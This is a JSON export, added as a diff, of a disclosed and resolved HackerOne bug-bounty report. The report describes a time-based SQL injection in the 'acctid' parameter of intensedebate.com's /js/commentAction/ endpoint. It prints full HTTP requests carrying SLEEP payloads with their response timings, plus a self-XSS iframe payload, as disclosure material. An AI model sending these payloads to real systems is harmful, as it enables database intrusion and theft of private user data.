@@ -1,0 +1,150 @@
+{
+  "id": 1044698,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQ0Njk4",
+  "url": "https://hackerone.com/reports/1044698",
+  "title": "[intensedebate.com] SQL Injection Time Based On /js/commentAction/",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-11-26T18:12:48.943Z",
+  "submitted_at": "2020-11-26T18:12:48.990Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fuzzme",
+    "url": "/fuzzme",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/F9LSiEs1ckRkcUXxrvznmg2n/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-01-01T09:19:37.451Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-12-16T21:22:58.075Z",
+  "team_member_agreed_on_going_public_at": "2021-01-01T09:19:37.364Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "[intensedebate.com] SQLi Time Based On /js/commentAction/\n\n## Summary:\n\nHello,\n\nI have found a SQLI Injection Time Based on `/js/commentAction/`.\n\nWhen a user want to submit/reply to a comment, a JSON payload was send by a GET request.\n\n\n```GET /js/commentAction/?data={\"request_type\":\"0\",+\"params\":+{+\"firstCall\":true,+\"src\":0,+\"blogpostid\":504704482,+\"acctid\":\"251219\",+\"parentid\":\"0\",+\"depth\":\"0\",+\"type\":\"1\",+\"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",+\"anonName\":\"\",+\"anonEmail\":\"X\",+\"anonURL\":\"\",+\"userid\":\"26745290\",+\"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",+\"mblid\":\"1\",+\"tweetThis\":\"F\",+\"subscribeThis\":\"1\",+\"comment\":\"w\"}} HTTP/1.1\nHost: www.intensedebate.com```\n\nThe key `\"acctid\":\"251219\"` is vulnerable to SQL Injection Time based\n\n\n## Detection :\n\n```\nGET /js/commentAction/?data={\"request_type\":\"0\",+\"params\":+{+\"firstCall\":true,+\"src\":0,+\"blogpostid\":504704482,+\"acctid\":\"251219%20AND%20SLEEP(15)%23\",+\"parentid\":\"0\",+\"depth\":\"0\",+\"type\":\"1\",+\"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",+\"anonName\":\"\",+\"anonEmail\":\"X\",+\"anonURL\":\"\",+\"userid\":\"26745290\",+\"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",+\"mblid\":\"1\",+\"tweetThis\":\"F\",+\"subscribeThis\":\"1\",+\"comment\":\"w\"}} HTTP/1.1\nHost: www.intensedebate.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0\nAccept: */*\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20\nCookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w\n```\n\nHTTP Response `15 414 millis`\n\n\n```\nGET /js/commentAction/?data={\"request_type\":\"0\",+\"params\":+{+\"firstCall\":true,+\"src\":0,+\"blogpostid\":504704482,+\"acctid\":\"251219%20AND%20SLEEP(7)%23\",+\"parentid\":\"0\",+\"depth\":\"0\",+\"type\":\"1\",+\"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",+\"anonName\":\"\",+\"anonEmail\":\"X\",+\"anonURL\":\"\",+\"userid\":\"26745290\",+\"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",+\"mblid\":\"1\",+\"tweetThis\":\"F\",+\"subscribeThis\":\"1\",+\"comment\":\"w\"}} HTTP/1.1\nHost: www.intensedebate.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0\nAccept: */*\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20\nCookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w\n```\n\nHTTP Response `7 660 millis`\n\nBonus :  the  key`\"src\":0` is vulnerable to self-XSS, change the value by `\"<iframe%20src=%23%20onload=alert('XSS')>\"` and you will see a XSS pop-up\n\n\n## POC\n\nSQLi Time based : sleep_7.png, sleep_15.png and POC.mp4\nSelf-XSS : Self-XSS.mp4\n\n\nThank you, good bye.\n\nFuzzme.\n\n## Impact\n\nFull database access holding private user information.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1095358,
+      "file_name": "sleep_7.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xix1hatbo7k16tvrml66r7khejen?response-content-disposition=attachment%3B%20filename%3D%22sleep_7.png%22%3B%20filename%2A%3DUTF-8%27%27sleep_7.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR2TUZZQ7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T074954Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIAX7nd1mXWnOzZ5vzZXJgH7pc7scnH7wLxyk1Qfmsfd2AiB%2FUiXxAqkELnPbaWPXMYL31h3fpJyv2oAbab3ra188Aiq7BQj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM%2FDT9vhrIi5P%2BLkEIKo8FSQnT3L2az%2FzzPFL1azD4qZtHxfNNFRj2%2FkUS69SPoTmIYYH5vuOSz6FHbBynJKUwmKpmQiUU5C5A4E40dG7b67M7XhZ44e5mbOvintgAVeiDXbEhh6m8i79ab41sx2uhTPPtOWjMVO5mUTYyL8HYkJqsnOPJzwWtU4jiYTR8Ar9i8bvImW9aKzz50ykQIUhHUjh7goEfyMRVrsd8LflkGPg6OSF01NrA4XlwfS1NYwd7ALwS7AKBQhFtAUHT9yv9R56NzwHrDWc2LjyK8FhHKNeBCAo9aDZG2Ff9CN0Knhvk9cj9o3lroIfQe7YmKFYSDUyIpHCzhk%2Fi45MF6WfsNKK4l22Njpb%2FUgzr8S%2Bp%2BjNc2J4yhLCivMhIMDzk9XwmhwSprldOwmE89rtTnrvADIIwoovcglBc5yj7g3pBM1ifnAELEZLLWoYf5ObvgbsKmJ7WcZikcMJRFSjZkW%2BCmJArNk0NXcSNFsNg0zybYvIm2a3PhGV220doXthAgUtxb00duRkAuVIWyUbBrBxbpaGFCIwM6J9ovzAdusfem6SZCP%2FdidsNjPctxCw%2BBzuRQafBaHR%2FnE98AeA9fIa40FIS0sin%2B8DiR00mOuLoTOc8Ee9IZKwfDvh5mmE6VHRysxqJvIw2TPGPBqSfbzMuFNt5OJ9nJIbVECchoraAqoS2SMAtVQQ5yMz%2B2pDiOwK9Yy%2Fv9FT9Uv9l3iv%2Fc2lcDO5iU7hADGA8vvnE%2FnfPFWLq592hZQIsqmxfpK63263BBhCFDlOLLSA63%2BjTw1bMkZJMobMJK7PXfBtzVowHid5FE4wUlzBFUT2mT0pdxXv55PjiBvugk5jlXTlvtQc8ZBVVD86%2BF0NrOlKbsJWcszDWrr7GBjqyAUgLTlRENs%2Bdwl3I5pA0YvAoTC1o0XiCD2V%2FFn8fTj0Hr44AM2sQBHo7OPgSk2ecXckGXgQ9rNffpPcPbNfXMW1wcg1k47bW5So6hmcZuVacIW2m%2BrrNsilFdluR%2B1oORS0tm6g3WjE6FA%2BfimZcdQ6c%2FIbxdGoa8VSHDqNkZ%2FBq%2BinQmd%2Fbof1uVc8oXM5PGkTrYDJV76UOvLxy80AZUljv8K2D58I02pPfsuCCbYjSgQY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6ed4a6fb648c956512265a01a65ac575b88492d31b0e5b5b366b917f37314a34",
+      "file_size": 172207,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1095359,
+      "file_name": "sleep_15.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/686ygtpfx4268ehsm9xvafy82uvv?response-content-disposition=attachment%3B%20filename%3D%22sleep_15.png%22%3B%20filename%2A%3DUTF-8%27%27sleep_15.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR2TUZZQ7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T074954Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIAX7nd1mXWnOzZ5vzZXJgH7pc7scnH7wLxyk1Qfmsfd2AiB%2FUiXxAqkELnPbaWPXMYL31h3fpJyv2oAbab3ra188Aiq7BQj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM%2FDT9vhrIi5P%2BLkEIKo8FSQnT3L2az%2FzzPFL1azD4qZtHxfNNFRj2%2FkUS69SPoTmIYYH5vuOSz6FHbBynJKUwmKpmQiUU5C5A4E40dG7b67M7XhZ44e5mbOvintgAVeiDXbEhh6m8i79ab41sx2uhTPPtOWjMVO5mUTYyL8HYkJqsnOPJzwWtU4jiYTR8Ar9i8bvImW9aKzz50ykQIUhHUjh7goEfyMRVrsd8LflkGPg6OSF01NrA4XlwfS1NYwd7ALwS7AKBQhFtAUHT9yv9R56NzwHrDWc2LjyK8FhHKNeBCAo9aDZG2Ff9CN0Knhvk9cj9o3lroIfQe7YmKFYSDUyIpHCzhk%2Fi45MF6WfsNKK4l22Njpb%2FUgzr8S%2Bp%2BjNc2J4yhLCivMhIMDzk9XwmhwSprldOwmE89rtTnrvADIIwoovcglBc5yj7g3pBM1ifnAELEZLLWoYf5ObvgbsKmJ7WcZikcMJRFSjZkW%2BCmJArNk0NXcSNFsNg0zybYvIm2a3PhGV220doXthAgUtxb00duRkAuVIWyUbBrBxbpaGFCIwM6J9ovzAdusfem6SZCP%2FdidsNjPctxCw%2BBzuRQafBaHR%2FnE98AeA9fIa40FIS0sin%2B8DiR00mOuLoTOc8Ee9IZKwfDvh5mmE6VHRysxqJvIw2TPGPBqSfbzMuFNt5OJ9nJIbVECchoraAqoS2SMAtVQQ5yMz%2B2pDiOwK9Yy%2Fv9FT9Uv9l3iv%2Fc2lcDO5iU7hADGA8vvnE%2FnfPFWLq592hZQIsqmxfpK63263BBhCFDlOLLSA63%2BjTw1bMkZJMobMJK7PXfBtzVowHid5FE4wUlzBFUT2mT0pdxXv55PjiBvugk5jlXTlvtQc8ZBVVD86%2BF0NrOlKbsJWcszDWrr7GBjqyAUgLTlRENs%2Bdwl3I5pA0YvAoTC1o0XiCD2V%2FFn8fTj0Hr44AM2sQBHo7OPgSk2ecXckGXgQ9rNffpPcPbNfXMW1wcg1k47bW5So6hmcZuVacIW2m%2BrrNsilFdluR%2B1oORS0tm6g3WjE6FA%2BfimZcdQ6c%2FIbxdGoa8VSHDqNkZ%2FBq%2BinQmd%2Fbof1uVc8oXM5PGkTrYDJV76UOvLxy80AZUljv8K2D58I02pPfsuCCbYjSgQY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=589fa218c30ae40acd8564d197bccc49e8e360e1a28899ac1cafd88b679db9ae",
+      "file_size": 174359,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1095368,
+      "file_name": "Self-XSS.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kh8sbirzrynevjrsh2bmoxuxc779?response-content-disposition=attachment%3B%20filename%3D%22Self-XSS.mp4%22%3B%20filename%2A%3DUTF-8%27%27Self-XSS.mp4&response-content-type=video%2Fogg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR2TUZZQ7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T074954Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIAX7nd1mXWnOzZ5vzZXJgH7pc7scnH7wLxyk1Qfmsfd2AiB%2FUiXxAqkELnPbaWPXMYL31h3fpJyv2oAbab3ra188Aiq7BQj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM%2FDT9vhrIi5P%2BLkEIKo8FSQnT3L2az%2FzzPFL1azD4qZtHxfNNFRj2%2FkUS69SPoTmIYYH5vuOSz6FHbBynJKUwmKpmQiUU5C5A4E40dG7b67M7XhZ44e5mbOvintgAVeiDXbEhh6m8i79ab41sx2uhTPPtOWjMVO5mUTYyL8HYkJqsnOPJzwWtU4jiYTR8Ar9i8bvImW9aKzz50ykQIUhHUjh7goEfyMRVrsd8LflkGPg6OSF01NrA4XlwfS1NYwd7ALwS7AKBQhFtAUHT9yv9R56NzwHrDWc2LjyK8FhHKNeBCAo9aDZG2Ff9CN0Knhvk9cj9o3lroIfQe7YmKFYSDUyIpHCzhk%2Fi45MF6WfsNKK4l22Njpb%2FUgzr8S%2Bp%2BjNc2J4yhLCivMhIMDzk9XwmhwSprldOwmE89rtTnrvADIIwoovcglBc5yj7g3pBM1ifnAELEZLLWoYf5ObvgbsKmJ7WcZikcMJRFSjZkW%2BCmJArNk0NXcSNFsNg0zybYvIm2a3PhGV220doXthAgUtxb00duRkAuVIWyUbBrBxbpaGFCIwM6J9ovzAdusfem6SZCP%2FdidsNjPctxCw%2BBzuRQafBaHR%2FnE98AeA9fIa40FIS0sin%2B8DiR00mOuLoTOc8Ee9IZKwfDvh5mmE6VHRysxqJvIw2TPGPBqSfbzMuFNt5OJ9nJIbVECchoraAqoS2SMAtVQQ5yMz%2B2pDiOwK9Yy%2Fv9FT9Uv9l3iv%2Fc2lcDO5iU7hADGA8vvnE%2FnfPFWLq592hZQIsqmxfpK63263BBhCFDlOLLSA63%2BjTw1bMkZJMobMJK7PXfBtzVowHid5FE4wUlzBFUT2mT0pdxXv55PjiBvugk5jlXTlvtQc8ZBVVD86%2BF0NrOlKbsJWcszDWrr7GBjqyAUgLTlRENs%2Bdwl3I5pA0YvAoTC1o0XiCD2V%2FFn8fTj0Hr44AM2sQBHo7OPgSk2ecXckGXgQ9rNffpPcPbNfXMW1wcg1k47bW5So6hmcZuVacIW2m%2BrrNsilFdluR%2B1oORS0tm6g3WjE6FA%2BfimZcdQ6c%2FIbxdGoa8VSHDqNkZ%2FBq%2BinQmd%2Fbof1uVc8oXM5PGkTrYDJV76UOvLxy80AZUljv8K2D58I02pPfsuCCbYjSgQY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6f40ceea4c2767f6fa254655aaf836db9ec7396c8595627c648229f56f88dc73",
+      "file_size": 7217061,
+      "type": "video/ogg",
+      "moderated": null
+    },
+    {
+      "id": 1095369,
+      "file_name": "POC.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ehufombrtslfafcse18btgc7fatd?response-content-disposition=attachment%3B%20filename%3D%22POC.mp4%22%3B%20filename%2A%3DUTF-8%27%27POC.mp4&response-content-type=video%2Fogg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR2TUZZQ7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T074954Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIAX7nd1mXWnOzZ5vzZXJgH7pc7scnH7wLxyk1Qfmsfd2AiB%2FUiXxAqkELnPbaWPXMYL31h3fpJyv2oAbab3ra188Aiq7BQj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM%2FDT9vhrIi5P%2BLkEIKo8FSQnT3L2az%2FzzPFL1azD4qZtHxfNNFRj2%2FkUS69SPoTmIYYH5vuOSz6FHbBynJKUwmKpmQiUU5C5A4E40dG7b67M7XhZ44e5mbOvintgAVeiDXbEhh6m8i79ab41sx2uhTPPtOWjMVO5mUTYyL8HYkJqsnOPJzwWtU4jiYTR8Ar9i8bvImW9aKzz50ykQIUhHUjh7goEfyMRVrsd8LflkGPg6OSF01NrA4XlwfS1NYwd7ALwS7AKBQhFtAUHT9yv9R56NzwHrDWc2LjyK8FhHKNeBCAo9aDZG2Ff9CN0Knhvk9cj9o3lroIfQe7YmKFYSDUyIpHCzhk%2Fi45MF6WfsNKK4l22Njpb%2FUgzr8S%2Bp%2BjNc2J4yhLCivMhIMDzk9XwmhwSprldOwmE89rtTnrvADIIwoovcglBc5yj7g3pBM1ifnAELEZLLWoYf5ObvgbsKmJ7WcZikcMJRFSjZkW%2BCmJArNk0NXcSNFsNg0zybYvIm2a3PhGV220doXthAgUtxb00duRkAuVIWyUbBrBxbpaGFCIwM6J9ovzAdusfem6SZCP%2FdidsNjPctxCw%2BBzuRQafBaHR%2FnE98AeA9fIa40FIS0sin%2B8DiR00mOuLoTOc8Ee9IZKwfDvh5mmE6VHRysxqJvIw2TPGPBqSfbzMuFNt5OJ9nJIbVECchoraAqoS2SMAtVQQ5yMz%2B2pDiOwK9Yy%2Fv9FT9Uv9l3iv%2Fc2lcDO5iU7hADGA8vvnE%2FnfPFWLq592hZQIsqmxfpK63263BBhCFDlOLLSA63%2BjTw1bMkZJMobMJK7PXfBtzVowHid5FE4wUlzBFUT2mT0pdxXv55PjiBvugk5jlXTlvtQc8ZBVVD86%2BF0NrOlKbsJWcszDWrr7GBjqyAUgLTlRENs%2Bdwl3I5pA0YvAoTC1o0XiCD2V%2FFn8fTj0Hr44AM2sQBHo7OPgSk2ecXckGXgQ9rNffpPcPbNfXMW1wcg1k47bW5So6hmcZuVacIW2m%2BrrNsilFdluR%2B1oORS0tm6g3WjE6FA%2BfimZcdQ6c%2FIbxdGoa8VSHDqNkZ%2FBq%2BinQmd%2Fbof1uVc8oXM5PGkTrYDJV76UOvLxy80AZUljv8K2D58I02pPfsuCCbYjSgQY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=748f6f012b9ca2d29b7b6d1ebe2a31b90ea632939c20d5e3489e30299361adea",
+      "file_size": 13724538,
+      "type": "video/ogg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-01-15T21:22:58.210Z",
+  "allow_singular_disclosure_after": -147695216.10184804,
+  "singular_disclosure_allowed": true,
+  "vote_count": 126,
+  "voters": [
+    "br0x1337",
+    "aboba",
+    "tokyoenigma",
+    "sw33tlie",
+    "xploiterr",
+    "bhuku",
+    "redhotchilihacker_",
+    "mattberg",
+    "un4gi",
+    "bibekshah",
+    "and 116 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
